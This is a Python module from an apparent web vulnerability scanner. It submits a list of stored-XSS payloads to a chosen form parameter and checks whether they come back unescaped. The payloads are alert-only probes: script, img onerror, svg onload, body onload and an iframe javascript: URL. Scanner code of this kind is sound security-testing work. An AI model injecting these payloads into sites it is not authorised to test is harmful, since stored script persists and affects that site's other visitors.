from utils import get_session, rate_sleep
from report import section, vuln, safe, log
from bs4 import BeautifulSoup

def check_stored_xss(url, submit_path=None, param_name=None):
    section("Stored XSS")
    session = get_session()
    vulnerable = False

    # Common XSS payloads
    xss_payloads = [
        "<script>alert(\'XSS\')</script>",
        "<img src=x onerror=alert(\'XSS\')>",
        "<svg/onload=alert(\'XSS\')>",
        "<body onload=alert(\'XSS\')>",
        "<iframe src=\"javascript:alert(\'XSS\')\"></iframe>"
    ]

    log(f"[*] Testing for Stored XSS on: {url}")

    # If submit_path and param_name are not provided, try to guess or skip
    if not submit_path or not param_name:
        log("[-] Stored XSS module requires 'submit_path' and 'param_name' for effective testing.")
        log("[-] Skipping generic Stored XSS test. Please provide these arguments for a targeted scan.")
        safe("Stored XSS test skipped due to missing parameters.")
        return

    submission_url = url.rstrip('/') + '/' + submit_path.lstrip('/')

    for payload in xss_payloads:
        log(f"[*] Attempting to inject payload: {payload[:50]}...")
        try:
            rate_sleep()
            # Simulate submitting the payload
            data = {param_name: payload}
            post_response = session.post(submission_url, data=data, timeout=10)
            log(f"[*] Payload submitted to {submission_url} with status: {post_response.status_code}")

            rate_sleep()
            # Fetch the original page to see if the payload is reflected
            get_response = session.get(url, timeout=10)
            soup = BeautifulSoup(get_response.text, 'html.parser')

            # Check if the payload is present in the HTML content
            if payload in get_response.text:
                vuln(
                    f"Stored XSS vulnerability detected! Payload \'{payload}\' reflected.",
                    "CRITICAL",
                    verify_cmd=f"Submit payload \'{payload}\' to {submission_url} and check {url}"
                )
                vulnerable = True
                break # Found one, no need to test other payloads
            else:
                log(f"[*] Payload not reflected for: {payload[:50]}...")

        except Exception as e:
            log(f"[-] Error testing Stored XSS with payload \'{payload[:50]}...\': {e}")

    if not vulnerable:
        safe("No Stored XSS vulnerabilities detected with provided payloads and parameters.")
